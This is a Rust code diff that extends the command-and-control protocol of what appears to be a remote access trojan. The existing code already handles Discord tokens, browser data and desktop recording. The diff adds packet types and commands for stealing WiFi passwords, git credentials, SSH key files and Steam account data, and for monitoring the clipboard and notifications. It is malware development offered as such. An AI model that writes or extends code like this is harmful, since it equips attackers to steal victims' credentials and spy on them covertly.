@@ -41,6 +41,13 @@ pub enum ServerboundPacket {
     DesktopRecordingFile(FileData),
     DiscordTokenData(DiscordTokenData),
     BrowserData(BrowserData),
+    WifiData(WifiData),
+    SoftwareInventory(SoftwareInventory),
+    GitData(GitData),
+    SSHData(SSHData),
+    SteamData(SteamData),
+    ClipboardUpdate(ClipboardUpdate),
+    NotificationEvent(NotificationEvent),
 }
 
 impl Packet for ServerboundPacket {
@@ -80,6 +87,13 @@ impl Packet for ServerboundPacket {
             ServerboundPacket::DesktopRecordingFile(_) => "Desktop Recording File",
             ServerboundPacket::DiscordTokenData(_) => "Discord Token Data",
             ServerboundPacket::BrowserData(_) => "Browser Data",
+            ServerboundPacket::WifiData(_) => "WiFi Data",
+            ServerboundPacket::SoftwareInventory(_) => "Software Inventory",
+            ServerboundPacket::GitData(_) => "Git Data",
+            ServerboundPacket::SSHData(_) => "SSH Data",
+            ServerboundPacket::SteamData(_) => "Steam Data",
+            ServerboundPacket::ClipboardUpdate(_) => "Clipboard Update",
+            ServerboundPacket::NotificationEvent(_) => "Notification Event",
         }
     }
 }
@@ -151,6 +165,15 @@ pub enum ClientboundPacket {
     GetOfflineLogs,
     ClearOfflineLogs,
     GetBrowserData,
+    GetWifiData,
+    GetSoftwareInventory,
+    GetGitData,
+    GetSSHData,
+    GetSteamData,
+    StartClipboardMonitor,
+    StopClipboardMonitor,
+    StartNotificationCapture,
+    StopNotificationCapture,
 }
 
 impl Packet for ClientboundPacket {
@@ -224,6 +247,15 @@ impl Packet for ClientboundPacket {
             ClientboundPacket::GetOfflineLogs => "Get Offline Logs",
             ClientboundPacket::ClearOfflineLogs => "Clear Offline Logs",
             ClientboundPacket::GetBrowserData => "Get Browser Data",
+            ClientboundPacket::GetWifiData => "Get Wifi Data",
+            ClientboundPacket::GetSoftwareInventory => "Get Software Inventory",
+            ClientboundPacket::GetGitData => "Get Git Data",
+            ClientboundPacket::GetSSHData => "Get SSH Data",
+            ClientboundPacket::GetSteamData => "Get Steam Data",
+            ClientboundPacket::StartClipboardMonitor => "Start Clipboard Monitor",
+            ClientboundPacket::StopClipboardMonitor => "Stop Clipboard Monitor",
+            ClientboundPacket::StartNotificationCapture => "Start Notification Capture",
+            ClientboundPacket::StopNotificationCapture => "Stop Notification Capture",
         }
     }
 }
@@ -381,6 +413,89 @@ pub enum TrollCommand {
 #[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
 pub struct BrowserData {
     pub browsers: Vec<BrowserResult>,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct WifiProfile {
+    pub ssid: String,
+    pub password: String,
+    pub authentication: String,
+    pub cipher: String,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct WifiData {
+    pub profiles: Vec<WifiProfile>,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct SoftwareEntry {
+    pub name: String,
+    pub version: String,
+    pub publisher: String,
+    pub install_location: String,
+    pub uninstall_command: String,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct SoftwareInventory {
+    pub applications: Vec<SoftwareEntry>,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct GitCredentialEntry {
+    pub source: String,
+    pub path: String,
+    pub url: String,
+    pub username: String,
+    pub password: String,
+    pub raw: String,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct ExtractedFile {
+    pub path: String,
+    pub contents: String,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct GitData {
+    pub credentials: Vec<GitCredentialEntry>,
+    pub configs: Vec<ExtractedFile>,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct SSHData {
+    pub files: Vec<ExtractedFile>,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct SteamAccountEntry {
+    pub steam_id: String,
+    pub account_name: String,
+    pub persona_name: String,
+    pub remember_password: String,
+    pub last_logon: String,
+    pub details: String,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct SteamData {
+    pub accounts: Vec<SteamAccountEntry>,
+    pub files: Vec<ExtractedFile>,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct ClipboardUpdate {
+    pub text: String,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct NotificationEvent {
+    pub source: String,
+    pub title: String,
+    pub message: String,
+    pub timestamp: String,
 }
 
 #[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
